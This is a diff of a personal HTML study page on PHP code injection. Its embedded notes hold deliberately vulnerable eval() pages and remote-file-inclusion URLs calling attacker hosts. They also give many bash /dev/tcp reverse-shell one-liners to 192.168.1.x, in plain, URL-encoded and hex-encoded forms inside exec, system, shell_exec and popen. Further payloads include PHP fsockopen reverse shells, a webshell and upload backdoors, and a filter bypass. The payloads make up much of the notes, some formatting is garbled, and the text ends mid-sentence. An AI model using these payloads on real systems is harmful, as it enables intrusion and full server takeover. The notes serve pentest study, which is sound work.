@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'unsafe-inline' https://fonts.googleapis.com; style-src 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; font-src https://fonts.gstatic.com; img-src 'self' data:;">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>CODE INJECTION — Cyber Security Notes</title>
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
@@ -16,31 +17,23 @@ body{background:var(--bg);font-family:'Rajdhani',sans-serif;color:var(--text);mi
 body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,217,255,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,217,255,0.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}
 .scanline{position:fixed;top:-100%;left:0;width:100%;height:2px;background:linear-gradient(transparent,rgba(0,217,255,0.1),transparent);animation:scan 6s linear infinite;pointer-events:none;z-index:1}
 @keyframes scan{to{top:110%}}
-
-/* TOPBAR */
 .topbar{position:relative;z-index:2;background:#0a0e15;border-bottom:1px solid var(--border);padding:10px 24px;display:flex;align-items:center;gap:14px}
 .back-btn{color:var(--accent);font-family:'Share Tech Mono',monospace;font-size:12px;text-decoration:none;border:1px solid rgba(0,217,255,0.3);padding:4px 14px;letter-spacing:1px;transition:all .2s}
 .back-btn:hover{background:rgba(0,217,255,0.08);border-color:var(--accent)}
 .breadcrumb{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--dim)}
 .breadcrumb em{color:var(--accent);font-style:normal}
-
-/* HEADER */
-.page-header{position:relative;z-index:2;padding:30px 24px 20px;border-bottom:1px solid var(--border);background:linear-gradient(135deg,#0a0e15,#0d1117)}
-.folder-icon{font-size:2.4rem;display:block;margin-bottom:10px}
-.folder-title{font-family:'Share Tech Mono',monospace;font-size:clamp(1.2rem,3vw,1.8rem);color:var(--accent);letter-spacing:3px;text-transform:uppercase;margin-bottom:6px}
+.page-header{position:relative;z-index:2;padding:28px 24px 18px;border-bottom:1px solid var(--border);background:linear-gradient(135deg,#0a0e15,#0d1117)}
+.folder-icon{font-size:2.2rem;display:block;margin-bottom:8px}
+.folder-title{font-family:'Share Tech Mono',monospace;font-size:clamp(1.2rem,3vw,1.8rem);color:var(--accent);letter-spacing:3px;text-transform:uppercase;margin-bottom:4px}
 .folder-meta{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--dim);letter-spacing:2px}
 .folder-meta em{color:var(--accent3);font-style:normal}
-.search-row{margin-top:14px;display:flex;align-items:center;gap:8px;background:var(--surface);border:1px solid var(--border);padding:8px 14px;max-width:400px}
+.search-row{margin-top:12px;display:flex;align-items:center;gap:8px;background:var(--surface);border:1px solid var(--border);padding:8px 14px;max-width:380px}
 .search-row::before{content:'⌕';color:var(--accent);font-size:1rem}
-.s-input{background:none;border:none;outline:none;color:var(--accent);font-family:'Share Tech Mono',monospace;font-size:13px;width:100%;caret-color:var(--accent)}
+.s-input{background:none;border:none;outline:none;color:var(--accent);font-family:'Share Tech Mono',monospace;font-size:12px;width:100%;caret-color:var(--accent)}
 .s-input::placeholder{color:var(--dim)}
-
-/* LAYOUT */
-.layout{position:relative;z-index:2;display:grid;grid-template-columns:260px 1fr;min-height:calc(100vh - 180px)}
-@media(max-width:700px){.layout{grid-template-columns:1fr;grid-template-rows:220px 1fr}}
-
-/* SIDEBAR */
-.sidebar{border-right:1px solid var(--border);background:#0a0e15;overflow-y:auto;position:sticky;top:0;max-height:calc(100vh - 130px)}
+.layout{position:relative;z-index:2;display:grid;grid-template-columns:250px 1fr;min-height:calc(100vh - 170px)}
+@media(max-width:700px){.layout{grid-template-columns:1fr;grid-template-rows:200px 1fr}}
+.sidebar{border-right:1px solid var(--border);background:#0a0e15;overflow-y:auto;position:sticky;top:0;max-height:calc(100vh - 120px)}
 .sidebar::-webkit-scrollbar{width:3px}.sidebar::-webkit-scrollbar-thumb{background:#1e2d3d}
 .sidebar-head{padding:8px 14px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--dim);letter-spacing:3px;background:#080c10;border-bottom:1px solid var(--border);display:flex;justify-content:space-between}
 .sidebar-head span{color:var(--accent3)}
@@ -49,8 +42,6 @@ body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(
 .file-item.active{background:rgba(0,217,255,0.08);color:var(--accent);border-left:2px solid var(--accent)}
 .fi-icon{font-size:10px;margin-top:3px;flex-shrink:0;color:var(--accent2)}
 .fi-name{font-family:'Share Tech Mono',monospace;font-size:11px;line-height:1.5;text-transform:capitalize}
-
-/* VIEWER */
 .viewer{display:flex;flex-direction:column}
 .viewer-bar{background:#080c10;border-bottom:1px solid var(--border);padding:8px 20px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--dim);display:flex;align-items:center;gap:8px}
 .v-dot{width:9px;height:9px;border-radius:50%;display:inline-block}
@@ -58,11 +49,7 @@ body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(
 .v-path{color:var(--text);margin-left:6px}
 .viewer-content{padding:28px 36px;line-height:1.85;font-size:15px;overflow-y:auto;flex:1}
 @media(max-width:700px){.viewer-content{padding:16px}}
-
-/* PLACEHOLDER */
 .placeholder{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:300px;gap:12px;color:var(--dim);font-family:'Share Tech Mono',monospace;font-size:12px;letter-spacing:2px}
-
-/* MARKDOWN STYLES */
 .viewer-content h1{font-family:'Share Tech Mono',monospace;font-size:1.3rem;color:var(--accent);border-bottom:1px solid var(--border);padding-bottom:8px;margin:24px 0 12px;letter-spacing:2px}
 .viewer-content h2{font-family:'Share Tech Mono',monospace;font-size:1rem;color:var(--accent3);margin:20px 0 10px;letter-spacing:1px}
 .viewer-content h3{font-size:.95rem;color:var(--yellow);margin:16px 0 8px;font-weight:700}
@@ -70,7 +57,7 @@ body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(
 .viewer-content p{margin-bottom:10px;color:var(--text);font-family:'Rajdhani',sans-serif;font-size:15px}
 .viewer-content code{background:rgba(0,217,255,0.07);color:var(--accent3);padding:2px 7px;border:1px solid rgba(0,217,255,0.15);font-family:'Share Tech Mono',monospace;font-size:12px;border-radius:2px}
 .viewer-content pre{background:#020509;border:1px solid var(--border);border-left:3px solid var(--accent);padding:14px 18px;margin:12px 0;overflow-x:auto;border-radius:2px}
-.viewer-content pre code{background:none;border:none;padding:0;color:var(--accent3);font-size:12px;display:block}
+.viewer-content pre code{background:none;border:none;padding:0;color:var(--accent3);font-size:12px;display:block;white-space:pre}
 .viewer-content ul,.viewer-content ol{padding-left:20px;margin-bottom:10px}
 .viewer-content li{margin-bottom:4px;color:var(--text);font-family:'Rajdhani',sans-serif;font-size:15px}
 .viewer-content li::marker{color:var(--accent)}
@@ -83,20 +70,16 @@ body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(
 .viewer-content td{padding:7px 12px;border:1px solid var(--border);color:var(--text)}
 .viewer-content tr:nth-child(even) td{background:rgba(255,255,255,0.02)}
 .viewer-content a{color:var(--accent);text-decoration:none;border-bottom:1px dashed rgba(0,217,255,0.4)}
-.viewer-content a:hover{color:#fff}
-
-footer{position:relative;z-index:2;border-top:1px solid var(--border);padding:16px 24px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--dim)}
+footer{position:relative;z-index:2;border-top:1px solid var(--border);padding:14px 24px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--dim)}
 footer span{color:var(--accent2)}
 </style>
 </head>
 <body>
 <div class="scanline"></div>
-
 <div class="topbar">
   <a class="back-btn" href="../index.html">← BACK</a>
   <div class="breadcrumb">~/vault/<em>CODE INJECTION</em>/</div>
 </div>
-
 <div class="page-header">
   <span class="folder-icon">💉</span>
   <div class="folder-title">CODE INJECTION</div>
@@ -105,7 +88,6 @@ footer span{color:var(--accent2)}
     <input class="s-input" id="searchInput" placeholder="search notes..." oninput="filterFiles()">
   </div>
 </div>
-
 <div class="layout">
   <div class="sidebar">
     <div class="sidebar-head">FILES <span id="visCount">4</span></div>
@@ -117,35 +99,33 @@ footer span{color:var(--accent2)}
       <span class="v-path" id="vPath">select a note</span>
     </div>
     <div class="viewer-content" id="viewerContent">
-      <div class="placeholder">
-        <div>← SELECT A NOTE FROM THE LIST</div>
-      </div>
+      <div class="placeholder">← SELECT A NOTE FROM THE LIST</div>
     </div>
   </div>
 </div>
-
 <footer><p>© 2026 <span>Rohan Kushwah</span> · CODE INJECTION · 4 notes</p></footer>
 
 <script>
-// ALL NOTES DATA
 const NOTES = [{"name": "basic off code injection", "content": "# Code Injection\n\n## What is Code Injection?\n\n**Code Injection** is a cyberattack where an attacker inserts **malicious code** into an application.  \nThe application then **executes this code**, due to improper handling of **untrusted user input**.\n\nThis can allow attackers to:\n\n- Change application behavior\n    \n- Steal sensitive data\n    \n- Gain unauthorized system access\n    \n\n---\n\n## Why Code Injection Happens\n\n- No input validation\n    \n- No sanitization\n    \n- Unsafe use of functions like `eval()` or `include()`\n    \n- Trusting user-controlled data\n    \n\n---\n\n## How Code Injection Works\n\n1. Application accepts user input\n    \n2. Input is directly used in code execution\n    \n3. Malicious code is injected\n    \n4. Server executes attacker’s code\n    \n\n---\n\n## Examples of Code Injection\n\n### Example 1: PHP `include()` Injection\n\n**Vulnerable Code (concept):**\n\n`include($_GET['page']);`\n\n**Normal request:**\n\n`http://testsite.com/index.php?page=contact.php`\n\n**Malicious request:**\n\n`http://testsite.com/?page=http://evilsite.com/evilcode.php`\n\n✅ Result:  \nThe server loads and executes the attacker’s **remote PHP script**.\n\n---\n\n### Example 2: PHP `eval()` Injection\n\n**Vulnerable Code:**\n\n`$myvar = \"varname\"; $x = $_GET['arg']; eval(\"$myvar = $x;\");`\n\n**Malicious input:**\n\n`phpinfo()`\n\n✅ Result:  \nAttacker executes arbitrary PHP code on the server.\n\n---\n\n## Difference from Command Injection\n\n- **Code Injection** → Injects code in the application’s language (PHP, SQL, JS)\n    \n- **Command Injection** → Injects OS shell commands\n    \n\n---\n\n## Types of Code Injection\n\n- PHP Code Injection\n    \n- SQL Injection\n    \n- JavaScript Injection\n    \n- Expression Language Injection\n    \n- Template Injection\n    \n\n---\n\n## Impact of Code Injection\n\n- Remote Code Execution (RCE)\n    \n- Data theft\n    \n- Website defacement\n    \n- Full server compromise\n    \n\n---\n\n## Prevention / Protection\n\n✔ Validate all user input  \n✔ Use allowlists (not blacklists)  \n✔ Avoid `eval()`, dynamic `include()`  \n✔ Use prepared statements  \n✔ Encode output properly  \n✔ Apply least privilege\n\n---\n\n## One-Line Definition (Exam Ready)\n\n> **Code Injection is a vulnerability where attackers inject malicious code into an application, which is then executed due to improper input validation.**\n\n\n\n# code-\n\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Code Injection</title>\n</head>\n<body>\n\n<pre>\n<?php\n    $fun = $_REQUEST['fun'];\n\n    echo $fun . \"<br>\";\n\n    eval($fun.\";\");\n?>\n</pre>\n\n</body>\n</html>\n\n\n# Code Injection – PHP eval() Example\n\n## Description\n\nThe following PHP script demonstrates a **Code Injection vulnerability** caused by the unsafe use of the `eval()` function with user-controlled input.\n\n### Example URLs\n```text\nhttp://192.168.1.31/web-pentest/code-injection.php?fun=sleep(10)\nhttp://192.168.1.31/web-pentest/code-injection.php?fun=phpinfo()\nVulnerable Code (Concept)\nThe application retrieves a parameter named fun from the user request and executes it as PHP code.\n\nphp\nCopy code\n$fun = $_REQUEST['fun'];\necho $fun . \"<br>\";\neval($fun . \";\");\nExplanation\nThe line\n\nphp\nCopy code\n$fun = $_REQUEST['fun'];\nassigns user-controlled input (GET, POST, or COOKIE) to the $fun variable.\n\nThe line\n\nphp\nCopy code\necho $fun . \"<br>\";\nprints the raw user input back to the browser without sanitization.\n\nThe critical vulnerability lies in:\n\nphp\nCopy code\neval($fun . \";\");\nwhich executes the contents of $fun directly as PHP code.\n\nWhy This Is Dangerous\nThis creates a Code Injection vulnerability, allowing attackers to execute arbitrary PHP code on the server.\n\nAn attacker can:\n\nExecute system-level commands\n\nSteal or modify data\n\nCompromise the entire server\n\nPerform Remote Code Execution (RCE)\n\nSecurity Risk\nUsing eval() on unsanitized user input is extremely dangerous and should never be used in production environments.\n\nWhile this example demonstrates how simple code injection can be, it highlights a critical security risk.\n\nEducational Purpose\nThis example is intended only for learning and demonstration purposes, to emphasize:\n\nThe risks of unsafe code execution\n\nThe consequences of poor input validation\n\nThe importance of secure coding practices\n\nKey Takeaway\nNever execute user input as code. Avoid eval() and always validate, sanitize, and strictly control user input.\n````\n\n\n# what is reverse shell-\n## What is a Reverse Shell?\n\n![https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png?utm_source=chatgpt.com](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png?utm_source=chatgpt.com)\n\n![https://pub.mdpi-res.com/applsci/applsci-13-07161/article_deploy/html/images/applsci-13-07161-g001.png?1686819501=&utm_source=chatgpt.com](https://pub.mdpi-res.com/applsci/applsci-13-07161/article_deploy/html/images/applsci-13-07161-g001.png?1686819501=&utm_source=chatgpt.com)\n\n![https://silviavali.github.io/assets/img/SLAE/bindreverse.png?utm_source=chatgpt.com](https://silviavali.github.io/assets/img/SLAE/bindreverse.png?utm_source=chatgpt.com)\n\n4\n\nA **reverse shell** is a technique where a **target system initiates a connection back to an attacker’s machine** and provides remote command-line access.\n\nInstead of the attacker connecting **to** the victim, the **victim connects out** to the attacker.\n\n---\n\n## 🔹 Simple Definition\n\n> A reverse shell allows an attacker to remotely control a victim’s system after the victim system connects back to the attacker.\n\n---\n\n## 🔹 How a Reverse Shell Works (Conceptual Flow)\n\n1. **Attacker** starts a listener on their system\n    \n2. **Victim system** executes a command (via vulnerability)\n    \n3. Victim **initiates an outbound connection**\n    \n4. Attacker receives a **shell (command access)**\n    \n\n📌 This works even when the victim is behind a **firewall or NAT**.\n\n---\n\n## 🔹 Why Reverse Shells Are Used\n\n- Outbound connections are usually **allowed**\n    \n- Firewalls often **block incoming connections**\n    \n- Easier to bypass network restrictions\n    \n- Common in **post-exploitation**\n    \n\n---\n\n## 🔹 Reverse Shell vs Bind Shell\n\n|Feature|Reverse Shell|Bind Shell|\n|---|---|---|\n|Who connects?|Victim → Attacker|Attacker → Victim|\n|Firewall friendly|✅ Yes|❌ Often blocked|\n|Common usage|Very common|Less common|\n|Risk to attacker|Lower exposure|Higher exposure|\n\n---\n\n## 🔹 Where Reverse Shells Appear (Cyber Security)\n\n- Command Injection\n    \n- Remote Code Execution (RCE)\n    \n- File Upload vulnerabilities\n    \n- Deserialization flaws\n    \n- Web shells\n    \n\n---\n\n## 🔹 Real-World Analogy\n\n> Imagine a locked building where you **cannot enter**, but someone **inside calls you and hands over control** of everything inside.\n\n---\n\n## 🔹 Security Perspective (Defensive View)\n\n⚠️ Reverse shells indicate **system compromise**\n\n### Detection Methods\n\n- Unexpected outbound connections\n    \n- Suspicious processes (bash, sh, cmd spawning)\n    \n- IDS/IPS alerts\n    \n- EDR behavioral detection\n    \n\n### Prevention\n\n- Input validation\n    \n- Least privilege\n    \n- Egress filtering\n    \n- Web Application Firewall (WAF)\n    \n- Patch management\n    \n\n---\n\n## 🔹 One-Line Exam Answer\n\n> A reverse shell is a technique where a compromised system connects back to an attacker and provides remote command execution access.\n\n# commands for reverse   shell-\n`exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1\")`\n\n`exec(\"/bin/bash%20-c%20'bash%20-i%20>&%20/dev/tcp/192.168.1.8/443%200>&1'\")`\n\n`exec(\"/bin/bash%20-c%20'bash%20-i%20>&%20/dev/tcp/192.168.1.8/443%200>&1'\")`\n\n`exec(%22%2fbin%2fbash%20-c%20%27bash%20-i%20%3e%26%20%2fdev%2ftcp%2f192.168.1.8%2f443%200%3e%261%27%22)`\n### 🔹 `exec()` Variants\n\n`exec(\"/bin/bash - -i >& /dev/tcp/192.168.1.8/443 0>&1\") exec(\"/bin/bash - i & /dev/tcp/192.168.1.8/443 0>&1\") exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'\")`\n\n**URL-encoded**\n\n`exec(\"%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27\")`\n\n---\n\n### 🔹 `passthru()` Variants\n\n`passthru(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'\") passthru(\"/bin/bash - -i >& /dev/tcp/192.168.1.8/443 0>&1\")`\n\n**URL-encoded**\n\n`passthru(\"/bin/bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261%27\") passthru(\"%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22\")`\n\n---\n\n### 🔹 `system()` Variants\n\n`system(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'\") system(\"/bin/bash - -i >& /dev/tcp/192.168.1.8/443 0>&1\") system(\"/bin/bash - -i & /dev/tcp/192.168.1.8/443 0>&1\")`\n\n**URL-encoded**\n\n`system(\"%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22\")`\n\n---\n\n### 🔹 Fully URL-Encoded (Standalone)\n\n`%2fbin%2fbash%20-c%20%27bash%20-i%20%3e%26%20%2fdev%2ftcp%2f192.168.1.8%2f443%200%3e%261%27\n\n\n\ns## 📌 PHP `system()` Variants\n\n`system(\"%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22\");`\n\n**Hex-encoded**\n\n`%73%79%73%74%65%6d%28%22%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%38%2f%34%34%33%20%30%3e%26%31%27%22%29`\n\n---\n\n## 📌 PHP `shell_exec()` Variants\n\n### Plain\n\n`shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'\");`\n\n### URL-encoded (partial)\n\n`shell_exec(\"/bin/bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'\");`\n\n`shell_exec(\"/bin/bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261'\");`\n\n### Fully URL-encoded\n\n`shell_exec(\"%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22\");`\n\n### Hex-encoded\n\n`%73%68%65%6c%6c%5f%65%78%65%63%28%22%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%38%2f%34%34%33%20%30%3e%26%31%27%22%29`\n\n---\n\n## 📌 Command Execution Test (Benign)\n\n### Plain\n\n`ping -c 4 127.0.0.1`\n\n### URL-encoded\n\n`ping%20-c%204%20127.0.0.1`\n\n---\n\n## 📌 Standalone Bash Command\n\n### Plain\n\n`/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'`\n\n\ncopy this code this have ` IN FIRST 1 KE SIDE KA ICON KEYBOARD ME\n\n### URL-encoded\n\n`%2fbin%2fbash%20-c%20%27bash%20-i%20%3e%26%20%2fdev%2ftcp%2f192.168.1.8%2f443%200%3e%261%27`\n\n---\n\n## 📌 PHP `popen()` Variants\n\n`popen(\"id\", \"r\");`\n\n`popen(\"ping -c 4 127.0.0.1\", \"r\");`\n\npopen(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.7/443 0>&1'\", \"r\");\n---\n\n### ✅ Result\n\n- Grouped by **function**\n    \n- Encodings clearly separated\n    \n- Easy to read, copy, or document\n    \n- Suitable for **study, analysis, or reporting**\n\n# CODE INJECTION POST METHOD-\nIN POST ,METHOD URL NOT ENCODED IT DIRECTLY USED AS PAYLOAD\n\n# VIM - code-injection2.php\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Code Injection</title>\n</head>\n<body>\n\n<form action=\"code-injection-2.php\" method=\"POST\">\n    Function:\n    <input type=\"text\" name=\"fun\"><br />\n    <input type=\"submit\" name=\"run\" value=\"run\">\n</form>\n\n<pre>\n<?php\nif (isset($_POST['fun'])) {\n    $fun = $_POST['fun'];\n    eval($fun.\";\");\n}\n?>\n</pre>\n\n</body>\n</html>"}, {"name": "last functions for code injection vulnerblity", "content": "# code-\n<!DOCTYPE html>\n\n<html>\n\n<head>\n\n<title>Code Injection</title>\n\n</head>\n\n<body>\n\n  \n\n<form action=\"code-injection9.php\" method=\"POST\">\n\nFunction:\n\n<input type=\"text\" name=\"fun\"><br />\n\n<input type=\"submit\" name=\"run\" value=\"run\">\n\n</form>\n\n  \n\n<pre>\n\n<?php\n\n  \n\nif (isset($_POST['fun'])) {\n\n  \n\n$fun = $_POST['fun'];\n\n  \n\n// Allow only functions starting with phpinfo or print_r\n\nif (preg_match('/^phpinfo|print_r/', $fun)) {\n\n  \n\n// ❌ Dangerous: Executes user input\n\neval($fun . \";\");\n\n  \n\n} else {\n\necho \"Error\";\n\n}\n\n}\n\n  \n\n?>\n\n</pre>\n\n  \n\n</body>\n\n</html>\n\n\n# bypass=\n## 📄 Screenshot 5 — Explanation Panel (From Image)\n\n### Example:\n\n`system('id'); phpinfo();`\n\n### Explanation:\n\n- `system('id')` → shows system user info\n    \n- `phpinfo()` → displays PHP configuration\n    \n\n🧠 **Order matters**, but **risk remains the same**\n\n---\n\n### Another Example:\n\n`print_r($_POST); system('id');`\n\n📌 **Security Impact**\n\n- Leaks POST data\n    \n- Executes system command\n    \n- Reveals server environment"}, {"name": "other reveerse shell functions", "content": "# 🛡️ PHP Code Injection - Educational Security Reference\n\n> **⚠️ DISCLAIMER:** This document is for educational and defensive security purposes only. Understanding these vulnerabilities helps security professionals protect systems. Never use this information for unauthorized access or malicious activities.\n\n---\n\n## 📋 Table of Contents\n\n1. [Overview](https://claude.ai/chat/79c74679-16fc-4bff-bc82-0c8308138df2#overview)\n2. [Dangerous PHP Functions](https://claude.ai/chat/79c74679-16fc-4bff-bc82-0c8308138df2#dangerous-php-functions)\n3. [Attack Payloads](https://claude.ai/chat/79c74679-16fc-4bff-bc82-0c8308138df2#attack-payloads)\n4. [Flawed Mitigation Example](https://claude.ai/chat/79c74679-16fc-4bff-bc82-0c8308138df2#flawed-mitigation-example)\n5. [Proper Security Measures](https://claude.ai/chat/79c74679-16fc-4bff-bc82-0c8308138df2#proper-security-measures)\n\n---\n\n## 🎯 Overview\n\n### What is Code Injection?\n\nCode injection occurs when an attacker can insert and execute arbitrary code in an application. In PHP applications, this is particularly dangerous as it can lead to:\n\n- **Remote Code Execution (RCE)**\n- **Data Breaches**\n- **System Compromise**\n- **Complete Server Takeover**\n\n### Common Scenario\n\nThe educational example shows a **flawed mitigation attempt** that uses blacklisting to prevent code injection. This approach is fundamentally insecure because:\n\n✗ Blacklists can be bypassed  \n✗ New dangerous functions may not be blocked  \n✗ `eval()` should never be used with user input  \n✗ Defensive programming requires whitelisting, not blacklisting\n\n---\n\n## ⚠️ Dangerous PHP Functions\n\n### 1. `escapeshellcmd()`\n\nphp\n\n```php\n$safe_input = escapeshellcmd($user_input);\n```\n\n**Purpose:** Sanitizes command strings to escape shell metacharacters\n\n**Use Case:** When executing shell commands via `exec()` or `shell_exec()`\n\n**⚠️ Risk:**\n\n- Alone, it may not fully prevent injection\n- Must be combined with strict input validation\n- Original command logic must be secure\n\n**Security Level:** 🟡 Partial Protection\n\n---\n\n### 2. `include` / `require`\n\nphp\n\n```php\ninclude('/etc/passwd');\ninclude('http://192.168.1.7/php-reverse-shell.php');\nrequire('/etc/passwd');\nrequire('http://192.168.1.7/php-reverse-shell.php');\n```\n\n**Purpose:** Include and execute external PHP files\n\n**⚠️ Risks:**\n\n- **Local File Inclusion (LFI):** Read sensitive system files\n- **Remote File Inclusion (RFI):** Execute attacker-controlled code\n\n**Attack Examples:**\n\n|Attack Type|Code|Impact|\n|---|---|---|\n|LFI|`include('/etc/passwd')`|Attempts to include system password file, causing errors or information leakage|\n|RFI|`include('http://attacker.com/shell.php')`|Executes remote malicious code from attacker's server|\n\n**Security Level:** 🔴 Critical Risk\n\n---\n\n### 3. `file_put_contents()`\n\nphp\n\n```php\n$code = '<?php phpinfo(); ?>';\nfile_put_contents(\"phpinfo-test.php\", $code);\n```\n\n**Purpose:** Write data to a file (creates or overwrites)\n\n**⚠️ Risk:**\n\n- Write malicious PHP backdoors\n- Create webshells for persistent access\n- Overwrite critical system files\n- Deploy information disclosure scripts\n\n**Attack Example:**\n\nphp\n\n```php\n$backdoor = '<?php system($_GET[\"cmd\"]); ?>';\nfile_put_contents(\"backdoor.php\", $backdoor);\n// Attacker can now execute: backdoor.php?cmd=whoami\n```\n\n**Impact:** Creates a file that reveals complete PHP configuration when accessed\n\n**Security Level:** 🔴 High Risk\n\n---\n\n### 4. `file_get_contents()`\n\nphp\n\n```php\n$content = file_get_contents(\"/etc/passwd\");\necho nl2br(htmlspecialchars($content));\n```\n\n**Purpose:** Read file or URL contents into a string\n\n**⚠️ Risk:**\n\n- Read sensitive system files\n- Fetch remote malicious content\n- Information disclosure\n- Server-Side Request Forgery (SSRF)\n\n**Attack Scenarios:**\n\n|Scenario|Code|Result|\n|---|---|---|\n|Local File Read|`file_get_contents('/etc/passwd')`|Exposes system user information|\n|Remote Fetch|`file_get_contents('http://attacker.com/payload')`|Retrieves attacker-controlled content|\n|SSRF|`file_get_contents('http://internal-server/admin')`|Access internal resources|\n\n**Security Level:** 🔴 High Risk\n\n---\n\n### 5. `eval()` ⚡ MOST DANGEROUS\n\nphp\n\n```php\n$code = 'echo \"Hello, World!\";';\neval($code);\n```\n\n**Purpose:** Evaluate and execute PHP code from a string at runtime\n\n**⚠️ Critical Risks:**\n\n- **Remote Code Execution (RCE)** - The ultimate security vulnerability\n- Executes arbitrary PHP code\n- No inherent security boundaries\n- Complete system compromise possible\n\n**Why It's Dangerous:**\n\nphp\n\n```php\n// Attacker input: system('rm -rf /');\n$user_input = $_POST['code'];\neval($user_input); // NEVER DO THIS!\n```\n\n**Security Principle:** 🚫 **NEVER use `eval()` with user input under ANY circumstances**\n\n**Security Level:** 🔴🔴🔴 CRITICAL - NEVER USE WITH USER INPUT\n\n---\n\n## 💣 Attack Payloads\n\n### Reverse Shell Payload\n\nphp\n\n```php\n$ip = '192.168.1.7';\n$port = 443;\n$code = '<?php \n    set_time_limit(0); \n    $sock = fsockopen(\\'' . $ip . '\\', ' . $port . '); \n    $proc = proc_open(\\'/bin/sh\\', \n        array(0=>$sock, 1=>$sock, 2=>$sock), \n        $pipes\n    ); \n?>';\nfile_put_contents(\"reverse-shell.php\", $code);\n```\n\n**What It Does:**\n\n1. Opens TCP connection back to attacker (192.168.1.7:443)\n2. Spawns `/bin/sh` shell over the connection\n3. Redirects input/output/error to the socket\n4. Gives attacker remote command execution\n\n**Attack Flow:**\n\n```\n[Vulnerable Server] --TCP--> [Attacker's Machine]\n                             (listening on port 443)\n                    <--Shell Commands--\n                    --Command Output-->\n```\n\n**Impact:** Complete remote control of the compromised server\n\n---\n\n### File Upload Backdoor\n\nphp\n\n```php\n$file = fopen(\"upload2.php\", \"w\");\nfwrite($file, '<html>\n<form action=\"upload2.php\" method=\"post\" enctype=\"multipart/form-data\">\n    Select File to upload:\n    <input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\">\n    <input type=\"submit\" value=\"Upload\" name=\"submit\">\n</form>\n</html>\n<?php \nif(isset($_POST[\"submit\"])) {\n    $file_name = $_FILES[\"fileToUpload\"][\"name\"];\n    $file_tmp_name = $_FILES[\"fileToUpload\"][\"tmp_name\"];\n    if (move_uploaded_file($file_tmp_name, \"./\" . $file_name)) {\n        echo \"ok\";\n    }\n}\n?>');\nfclose($file);\n```\n\n**What It Does:**\n\n1. Creates an HTML form for file uploads\n2. No file type validation\n3. No file size restrictions\n4. No security checks whatsoever\n\n**⚠️ Risk:** Allows arbitrary file upload including:\n\n- PHP webshells\n- Malicious executables\n- Overwrite existing files\n- Execute uploaded PHP scripts\n\n**Attack Scenario:**\n\n1. Attacker uploads `malicious.php`\n2. File is saved to web-accessible directory\n3. Attacker accesses `http://target.com/malicious.php`\n4. Malicious code executes with web server privileges\n\n---\n\n### Combined Function Attack: `fsockopen`, `proc_open`, `file_put_contents`\n\nphp\n\n```php\n$ip = '192.168.1.7';\n$port = 443;\n$reverse_shell = '<?php \n    set_time_limit(0);\n    $sock = fsockopen(\\'' . $ip . '\\', ' . $port . ');\n    $proc = proc_open(\\'/bin/sh\\', \n        array(0=>$sock, 1=>$sock, 2=>$sock),\n        $pipes\n    );\n?>';\nfile_put_contents(\"reverse-shell.php\", $reverse_shell);\n```\n\n**Functions Used:**\n\n- `fsockopen()` - Opens network socket connection\n- `proc_open()` - Executes a program 